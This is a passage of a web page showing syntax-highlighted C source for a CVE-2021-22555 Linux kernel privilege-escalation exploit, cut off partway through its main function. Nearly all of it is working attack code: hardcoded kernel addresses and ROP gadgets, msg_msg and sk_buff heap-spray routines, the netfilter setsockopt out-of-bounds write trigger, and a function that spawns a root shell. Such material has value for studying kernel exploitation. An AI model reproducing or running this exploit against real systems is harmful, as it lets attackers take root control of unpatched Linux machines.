class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_PROXY 0xffffffff82a639a0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_RET 0xffffffff811594bd</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RAX_POP_RDI_RET 0xffffffff81159547</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810c7d40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810cfc90</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_eflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, esp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">packed__</span>)) &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> <span class="hljs-title">replace</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entry</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> <span class="hljs-title">match</span>;</span><br>        <span class="hljs-type">char</span> pad[<span class="hljs-number">0x108</span> + PRIMARY_MSG_SIZE - <span class="hljs-number">0x200</span> - <span class="hljs-number">0x2</span>];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> <span class="hljs-title">target</span>;</span><br>    &#125; data = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    data.replace.num_counters = <span class="hljs-number">1</span>;<br>    data.replace.num_entries = <span class="hljs-number">1</span>;<br>    data.replace.size = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    <br>    data.entry.next_offset = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    data.entry.target_offset = <br>            <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <br>    data.match.u.user.match_size = <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <span class="hljs-built_in">strcpy</span>(data.match.u.user.name, <span class="hljs-string">&quot;icmp&quot;</span>);<br>    data.match.u.user.revision = <span class="hljs-number">0</span>;<br><br>    data.target.u.user.target_size = <span class="hljs-keyword">sizeof</span>(data.target);<br>    <span class="hljs-built_in">strcpy</span>(data.target.u.user.name, <span class="hljs-string">&quot;NFQUEUE&quot;</span>);<br>    data.target.u.user.revision = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// partial overwrite the next object</span><br>    <span class="hljs-keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="hljs-keyword">sizeof</span>(data)))<br>        <span class="hljs-keyword">if</span> (errno == ENOPROTOOPT)<br>            errExit(<span class="hljs-string">&quot;ip_tables module is not loaded!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         socket_fd;<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// ident namespace</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// socket to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create socket!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(socket_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span 